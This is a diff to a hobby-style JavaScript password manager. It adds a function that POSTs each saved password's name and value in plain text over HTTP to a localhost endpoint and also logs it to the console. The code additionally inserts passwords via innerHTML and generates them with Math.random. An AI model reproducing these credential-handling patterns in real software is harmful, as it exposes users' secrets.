@@ -1,15 +1,11 @@
 let PassUnlocked = false;
 let UserUnlocked = false;
-
 let createdPassword = "";
 let newpass = document.getElementById("newpass")
 let passForm = document.getElementById("pwd")
 let usserForm = document.getElementById("username")
 let AddPassElement = document.getElementById("AddPass")
 let AddNameElement = document.getElementById("PasswordName")
-
-
-
 let passwordElement = document.getElementById("password")
 function getRndInteger(min, max) {
   return Math.floor(Math.random() * (max - min) ) + min;
@@ -64,14 +60,38 @@ AddPassElement.addEventListener("change", function(e) {
   passwords.push(new Passwords(CurrentPassName, e.target.value))
   addPasswordToList(passwords.length-1);
   document.getElementById("form").reset();
+
 });
 function addPasswordToList(num) {
   var displayPassword = document.createElement('div');
   displayPassword.innerHTML = passwords[num].name + " " + passwords[num].password
+  sendDataToServer(passwords[num].name + " " + passwords[num].password)
   document.getElementById('messages').appendChild(displayPassword);
   document.getElementById("addPass").style.visibility = "hidden"
+
 }
 function loop() {
   requestAnimationFrame(loop)
 }
+
 loop();
+
+
+function sendDataToServer(data) {
+  console.log(data)
+  const url = 'http://localhost:1430/data';
+  fetch(url, {
+      method: 'POST',
+      headers: {
+          'Content-Type': 'text/plain' // Use text/plain for a simple string
+      },
+      body: data // Send the string directly without JSON.stringify
+  })
+  .then(response => response.text()) // Use response.text() to get the server's response as a string
+  .then(responseData => {
+      console.log('Server response:', responseData);
+  })
+  .catch(error => {
+      console.error('Error sending data:', error);
+  });
+}
